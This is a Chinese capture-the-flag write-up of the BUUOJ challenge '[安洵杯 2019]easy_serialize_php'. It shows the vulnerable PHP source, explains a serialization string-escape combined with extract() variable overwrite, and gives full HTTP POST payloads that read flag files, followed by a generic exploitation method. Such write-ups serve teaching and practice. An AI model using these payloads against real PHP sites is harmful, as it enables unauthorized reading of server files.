# [安洵杯 2019]easy_serialize_php

[题目地址](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php)

之前比赛见过了，换个考法我又看懵了。

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

先看phpinfo里有啥。

- http://7ca9c8ed-9063-409c-8f5c-d2812947550e.node4.buuoj.cn:81/index.php?f=phpinfo

在auto_append_file一栏里找到了名为d0g3_f1ag.php的文件，应该就是flag了。那初步思路就是利用反序列化漏洞读取文件。当我们的function选择show_image时，系统就会读取userinfo内img字段的值，base64解码后读取文件名内的文件。往上看却发现img的值并不由我们控制，`$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));`是干扰项，多了个我们不想要的sha1，基本不可能满足我们的需求。是时候利用反序列化漏洞了。

在反序列化漏洞之前，`extract($_POST);`还有一个变量覆盖漏洞。然而我们并不能直接用这个漏洞覆盖`_SESSION['img']=xxx`，因为这个漏洞在系统设置img之前，无论我们怎么做都会被覆盖掉。专心看看反序列化吧。

`$serialize_info = filter(serialize($_SESSION));`是很明显的反序列化字符串逃逸漏洞。filter函数会把黑名单内的字符串置空，问题在于过滤的是序列化完成后的字符串，而不是之前。这样做会破坏反序列化字符串原有的结构，给我们可乘之机。先根据程序看一下正常情况下的反序列化字符串是什么样的。

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$function='echo';
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['img'] = base64_encode('guest_img.png');
$_serialize_result=filter(serialize($_SESSION));
echo $_serialize_result;
//a:3:{s:4:"user";s:5:"guest";s:8:"function";s:4:"echo";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

仔细看反序列化字符串正常的结构，这一点十分重要。现在我们要做的是把img的值改为d0g3_f1ag.php的base64编码。或者格局打开，我们不改img，我们造个自己的img。前面不是有个变量覆盖漏洞吗，我们利用那个漏洞给`_SESSION`添加一个条目：flagphp。先不传值，模拟一下输出。

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$function='echo';
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['flagphp']='';
$_SESSION['img'] = base64_encode('guest_img.png');
$_serialize_result=filter(serialize($_SESSION));
echo $_serialize_result;
//a:4:{s:4:"user";s:5:"guest";s:8:"function";s:4:"echo";s:7:"";s:0:"";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

现在直接unserialize是出不来东西的，因为对应flagphp键名的`s:7:`处对不上，这样搞会让php把后面的7个字符`";s:0:"`看成`s:7:`的值，再后面的键值对就无法对应了，img的值也没有改变。这就跟sql注入一样，我们自己构造一个img。

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
$function='echo';
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['flagphp']=';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = base64_encode('guest_img.png');
$_serialize_result=filter(serialize($_SESSION));
echo $_serialize_result;
//a:4:{s:4:"user";s:5:"guest";s:8:"function";s:4:"echo";s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

发现`s:7:`对上了，值是`";s:48:`，然后就到我们构造的键值对了。`;s:1:"1"`伪造了一个值，没有特殊意义，就是为了前面“键值对就无法对应”的问题不再发生。由于php解释格式化字符串到}就结束了，因此后面`";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`就被忽略了，不会引发错误。由此我们成功构造了一个自己的img。

```
POST /index.php?f=show_image HTTP/1.1
Host: 6e16278c-6291-4200-8834-3c51653d06dc.node4.buuoj.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

得知flag在/d0g3_fllllllag里。巧的是，/d0g3_fllllllag的base64编码也是20的长度，所以我们直接套payload就行了。

```
POST /index.php?f=show_image HTTP/1.1
Host: 6e16278c-6291-4200-8834-3c51653d06dc.node4.buuoj.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

总结一下利用php反序列化逃逸的步骤。

1. 确定利用目标
2. 按照原程序正常序列化的步骤做一遍，看看正常序列化字符串的结构，基于此考虑攻击方式。注意，键值对设置的顺序会影响序列化结果，一定要按照程序内的方式设置值。
3. 计算逃逸总共需要的字符，考虑需要构建多少被替换的字符。
4. 插入payload，结合本地运行结果查看payload是否成功

php反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。

## Flag
> flag{4664d9b1-533e-4c12-b3c7-9466ecaccbc6}